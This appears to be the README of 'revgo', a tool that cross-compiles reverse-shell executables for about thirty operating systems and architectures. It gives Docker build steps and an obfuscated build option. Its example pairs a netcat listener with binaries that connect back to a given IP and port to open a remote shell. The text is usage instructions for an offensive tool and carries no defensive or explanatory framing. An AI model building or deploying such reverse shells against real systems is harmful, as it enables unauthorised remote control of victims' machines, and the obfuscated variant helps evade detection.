#### 1. Build
```
# docker build -t revgo .
```

#### 2. Run (compile executables)
```
# mkdir /tmp/output/
# docker run --rm -it -v /tmp/output:/tmp revgo
```

#### 3. Example
```
# nc -nlvp 9999
# env IP=192.168.135.129 PORT=9999 /tmp/output/revgo_linux64
# env IP=192.168.135.129 PORT=9999 /tmp/output/revgo_linux64_obfuscated
```

#### 4. Platforms

| GOOS - Target Operating System | GOARCH - Target Platform |
|--------------------------------|--------------------------|
| android                        | arm                      |
| darwin                         | 386                      |
| darwin                         | amd64                    |
| darwin                         | arm                      |
| darwin                         | arm64                    |
| dragonfly                      | amd64                    |
| freebsd                        | 386                      |
| freebsd                        | amd64                    |
| freebsd                        | arm                      |
| linux                          | 386                      |
| linux                          | amd64                    |
| linux                          | arm                      |
| linux                          | arm64                    |
| linux                          | ppc64                    |
| linux                          | ppc64le                  |
| linux                          | mips                     |
| linux                          | mipsle                   |
| linux                          | mips64                   |
| linux                          | mips64le                 |
| netbsd                         | 386                      |
| netbsd                         | amd64                    |
| netbsd                         | arm                      |
| openbsd                        | 386                      |
| openbsd                        | amd64                    |
| openbsd                        | arm                      |
| plan9                          | 386                      |
| plan9                          | amd64                    |
| solaris                        | amd64                    |
| windows                        | 386                      |
| windows                        | amd64                    |